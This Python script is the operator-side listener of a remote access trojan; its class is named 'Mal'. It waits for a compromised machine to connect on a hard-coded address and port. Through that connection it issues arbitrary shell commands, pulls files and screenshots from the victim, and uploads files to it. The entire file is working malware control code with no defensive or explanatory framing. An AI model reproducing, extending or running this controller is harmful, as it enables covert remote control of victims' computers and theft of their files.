#!/usr/bin/python3
import socket
import time

class Mal():
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.__listen__()
        self.__main__()

    def __listen__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
       
        try:
            self.s.bind((self.ip,self.port))
            self.s.listen(1)
            print("[+] Listening For Connection...")
            self.c , self.a = self.s.accept()
            print(f"[+] Conntected To: {self.a[0]} {self.a[1]}")

        except Exception as e:
            print(f"[-] {str(e)[str(e).find(']')+2:]}")
            exit(1)
    
    def upload_file(self,f_name):
        try:
            f = open(f_name,'rb')
            self.c.send(f.read())
            f.close()
        except Exception as e:
            f = f"[-] {str(e)[str(e).find(']')+2:]}"
            f = f.encode()
            self.c.send(f)

    def download_file(self,f_name):
        try:
            f = open(f_name,'wb')
        except:
            f = open("TMPfailled",'wb')
        d = self.c.recv(1024)
        self.c.settimeout(2)
        while(d):
            f.write(d)
            try:
                d = self.c.recv(1024)
            except TimeoutError:
                break
        self.c.settimeout(None)
        f.close()


    def __main__(self):
        
        while(1):
            cmd = input("\n#$> ")
             
            if (cmd == "quit!"):
                self.c.send(cmd.encode())
                time.sleep(2)
                self.c.close()
                exit(0)
            
            elif (len(cmd) == 0):
                continue

            elif (cmd[:3] == "ss!"):
                self.c.send(cmd.encode())
                self.download_file(cmd[4:])
                

            elif (cmd[:9] == "download!"):
                self.c.send(cmd.encode())
                self.download_file(cmd[10:])
                
            
            elif (cmd[:7] == "upload!"):
                self.c.send(cmd.encode())
                self.upload_file(cmd[8:])
               

            else:
                try:
                    self.c.send(cmd.encode())
                    output = self.c.recv(1024)
                except Exception as e:
                    output = f"[-] {str(e)[str(e).find(']')+2:]}"
                    output = output.encode()
                while(len(output)):
                    try:
                        print(output.decode(),end="")
                    except:
                        print(output,end="")
                    self.c.settimeout(0.3)
                    try:
                        output = self.c.recv(1024)
                        
                    except TimeoutError:
                        break
                self.c.settimeout(None)

Mal("192.168.1.5",9999)
